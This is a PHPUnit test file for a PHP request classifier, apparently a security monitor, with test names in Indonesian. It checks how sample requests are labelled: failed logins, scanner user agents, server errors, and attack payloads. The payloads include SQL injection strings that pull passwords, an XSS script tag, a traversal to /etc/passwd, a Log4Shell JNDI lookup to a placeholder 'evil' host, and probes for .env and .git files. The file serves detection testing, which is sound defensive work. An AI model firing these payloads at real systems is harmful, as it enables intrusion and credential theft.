<?php

namespace Qaify\Sentinel\Tests;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase as Base;
use Qaify\Sentinel\Classifier;
use Qaify\Sentinel\Privacy;

final class ClassifierTest extends Base
{
    public static function cases(): array
    {
        return [
            'login gagal'          => ['POST', '/api/v1/auth/login', '', 401, null, true, 'auth_failed', 'login', 'low'],
            'login terkunci'       => ['POST', '/api/v1/auth/login', '', 429, null, true, 'auth_failed', 'login.locked', 'medium'],
            'login validasi 422'   => ['POST', '/api/v1/auth/login', '', 422, null, true, null, null, null],
            'sqli union ditolak'   => ['GET', '/api/items', 'q=1%20UNION%20SELECT%20password%20FROM%20users', 403, null, false, 'payload', 'sqli.union', 'medium'],
            'sqli boolean lolos'   => ['GET', '/api/items', "id=1'%20OR%20'1'='1", 200, null, false, 'payload', 'sqli.boolean', 'high'],
            'sqli encode ganda'    => ['GET', '/api/items', 'id=1%2527%2520OR%25201%253D1', 404, null, false, 'payload', 'sqli.boolean', 'medium'],
            'xss script'           => ['GET', '/search', 'q=%3Cscript%3Ealert(1)%3C/script%3E', 200, null, false, 'payload', 'xss.script', 'high'],
            'traversal'            => ['GET', '/files', 'name=../../../../etc/passwd', 400, null, false, 'payload', 'lfi.sensitive', 'medium'],
            'log4shell'            => ['GET', '/', 'x=${jndi:ldap://evil/a}', 404, null, false, 'payload', 'log4shell', 'high'],
            'probe .env 404'       => ['GET', '/.env', '', 404, null, false, 'probe_path', 'path.env', 'low'],
            'probe .git tersaji'   => ['GET', '/.git/config', '', 200, null, false, 'probe_path', 'path.git', 'high'],
            'probe wp'             => ['GET', '/wp-login.php', '', 404, 'Mozilla/5.0', false, 'probe_path', 'path.wordpress', 'low'],
            'scanner sqlmap'       => ['GET', '/api/items', '', 200, 'sqlmap/1.7 (https://sqlmap.org)', false, 'scanner', 'ua.sqlmap', 'medium'],
            'scan qaify'           => ['GET', '/api/items', '', 200, 'QaifyScanner/1.0', false, 'scanner', 'ua.qaify', 'medium'],
            '5xx'                  => ['GET', '/api/items', '', 500, null, false, 'server_error', 'http.500', 'low'],
            '403 biasa'            => ['DELETE', '/api/items/3', '', 403, null, false, 'forbidden', 'http.403', 'low'],
            'request normal'       => ['GET', '/api/items', 'page=2&sort=name', 200, 'Mozilla/5.0', false, null, null, null],
            'kata union wajar'     => ['GET', '/api/items', 'q=european%20union%20selection', 200, null, false, null, null, null],
            'koma & titik koma'    => ['GET', '/api/items', 'tags=a;b;c', 200, null, false, null, null, null],
        ];
    }

    #[DataProvider('cases')]
    public function test_classify(string $method, string $path, string $query, int $status, ?string $ua, bool $login, ?string $kind, ?string $rule, ?string $severity): void
    {
        $d = (new Classifier())->classify($method, $path, $query, $status, $ua, $login);

        $this->assertSame($kind, $d?->kind);
        $this->assertSame($rule, $d?->rule);
        $this->assertSame($severity, $d?->severity);
    }

    public function test_status_events_bisa_dimatikan(): void
    {
        $this->assertNull((new Classifier())->classify('GET', '/x', '', 500, null, false, false));
    }

    public function test_prefix_dan_hash(): void
    {
        $this->assertSame('203.0.113.0/24', Privacy::prefix('203.0.113.77'));
        $this->assertSame('2001:db8:85a3::/48', Privacy::prefix('2001:db8:85a3:8d3:1319:8a2e:370:7348'));
        $this->assertNull(Privacy::prefix('10.0.0.5'));
        $this->assertNull(Privacy::prefix('127.0.0.1'));

        $p = new Privacy('k');
        $this->assertSame($p->hash('Admin '), $p->hash('admin'));
        $this->assertMatchesRegularExpression('/^[a-f0-9]{64}$/', $p->hash('203.0.113.77'));
        $this->assertNull($p->hash(''));
    }
}
